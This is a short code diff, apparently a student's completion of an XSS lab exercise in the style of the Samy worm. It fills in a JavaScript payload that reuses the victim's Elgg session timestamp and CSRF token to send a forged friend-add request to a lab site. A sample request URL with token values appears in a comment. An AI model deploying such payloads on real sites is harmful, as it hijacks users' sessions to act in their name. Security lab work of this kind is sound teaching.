@@ -5,8 +5,10 @@
 	var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	//Construct the HTTP request to add Samy as a friend.
 
-	var sendurl=...; //FILL IN
+	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN
 
+
+	// http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624188449&__elgg_token=pjGWyXpTvM3N4OrLxPKcQg&__elgg_ts=1624188449&__elgg_token=pjGWyXpTvM3N4OrLxPKcQg
 	//Create and send Ajax request to add friend
 	Ajax=new XMLHttpRequest();
 	Ajax.open("GET",sendurl,true);
